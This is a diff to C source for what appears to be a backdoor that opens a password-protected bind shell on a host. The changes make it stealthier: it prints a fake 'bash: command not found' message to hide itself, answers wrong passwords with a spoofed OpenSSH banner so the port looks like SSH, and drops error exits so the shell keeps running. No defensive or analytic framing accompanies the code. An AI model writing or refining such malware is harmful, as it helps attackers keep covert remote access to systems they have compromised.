@@ -7,8 +7,8 @@
 
 int main(int argc, char **argv, char **envp) {
     if (getuid() != 0) {
-        printf("Invalid\n");
-        exit(0);
+        printf("bash: %s: command not found\n", argv[0]);
+        exit(1);
     }
 
     if (argc == 2 && strcmp(argv[1], "destroy") == 0) {
@@ -24,8 +24,8 @@ int main(int argc, char **argv, char **envp) {
     }
 
     if (is_set == 0) {
-        printf("Invalid\n");
-        exit(0);
+        printf("bash: %s: command not found\n", argv[0]);
+        exit(1);
     }
 
     setgid_s();
@@ -53,8 +53,6 @@ int main(int argc, char **argv, char **envp) {
         bind_shell();
         return 0;
     }
-
-    bind_shell();
 
     return 0;
 }
@@ -189,7 +187,6 @@ void* handle_client(void* arg) {
         int bytes_received = recv(client_fd, buffer, BUFFER_SIZE, 0);
         if (bytes_received < 0) {
             perror("recv failed");
-            exit(EXIT_FAILURE);
         }
 
         if (bytes_received == 0) {
@@ -198,6 +195,8 @@ void* handle_client(void* arg) {
 
         buffer[bytes_received] = '\0';
         if (messages_sent == 0 && strcmp(buffer, PASSWORD) != 0) {
+            // send fake response
+            send(client_fd, "SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.7\n", 34, 0);
             close(client_fd);
             return NULL;
         }
@@ -209,7 +208,6 @@ void* handle_client(void* arg) {
         int bytes_sent = send(client_fd, output, strlen(output), 0);
         if (bytes_sent < 0) {
             perror("send failed");
-            exit(EXIT_FAILURE);
         }
 
         free(output);
